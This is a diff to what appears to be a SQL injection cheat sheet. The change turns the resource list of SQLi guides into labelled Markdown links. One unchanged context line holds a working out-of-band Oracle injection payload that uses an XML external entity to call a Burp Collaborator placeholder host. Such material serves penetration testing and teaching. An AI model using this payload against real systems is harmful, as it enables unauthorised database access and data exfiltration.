@@ -116,12 +116,13 @@ OUT-OF-BAND
 '+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://BURP-COLLABORATOR-SUBDOMAIN/">+%remote;]>'),'/l')+FROM+dual--
 ```
 # Other Resources:
-<i>https://portswigger.net/web-security/sql-injection/cheat-sheet</i>
-<i>https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/</i>
-<i>https://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html</i>
-<i>https://brightsec.com/blog/error-based-sql-injection/#:~:text=What%20Is%20Error%2DBased%20SQL,actor%20of%20the%20database's%20structure</i>
-<i>https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/MSSQL%20-%20Error%20Based%20SQLi/README.md</i>
-<i>https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf</i>
-<i>https://www.pwc.com.tr/tr/assets/pdf/out-of-band-oob-sql-injection.pdf</i>
-<i>https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwj-ir6t7bCCAxX_FRAIHVEdCXU4ChAWegQIBRAB&url=https%3A%2F%2Fzenodo.org%2Frecord%2F3556347%2Ffiles%2FA%2520Study%2520of%2520Out-of-Band%2520SQL%2520Injection.pdf%3Fdownload%3D1&usg=AOvVaw0hGkiklfL04cE-qOCuEaPa&opi=89978449<i>
-<i>https://www.w3schools.com/sql/sql_comments.asp</i>
+* [Portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet) – Portswigger SQLi cheat sheet
+* [Guide book](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf) – SQLi guide
+* [Error Based SQli](https://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html) – Error Based SQLi cheat sheet
+* [SQLi Mysql](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet) – Mysql injection cheat sheet
+* [Error Based SQLi](https://brightsec.com/blog/error-based-sql-injection/#:~:text=What%20Is%20Error%2DBased%20SQL,actor%20of%20the%20database's%20structure) – Error Based SQLi cheat sheet
+* [Out of Band SQLi guide](https://www.pwc.com.tr/tr/assets/pdf/out-of-band-oob-sql-injection.pdf) –  guide
+* [Out of Band SQLi guide](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwj-ir6t7bCCAxX_FRAIHVEdCXU4ChAWegQIBRAB&url=https%3A%2F%2Fzenodo.org%2Frecord%2F3556347%2Ffiles%2FA%2520Study%2520of%2520Out-of-Band%2520SQL%2520Injection.pdf%3Fdownload%3D1&usg=AOvVaw0hGkiklfL04cE-qOCuEaPa&opi=89978449) – guide
+* [sqli](https://www.w3schools.com/sql/sql_comments.asp) – comment symbols
+* []() –
+
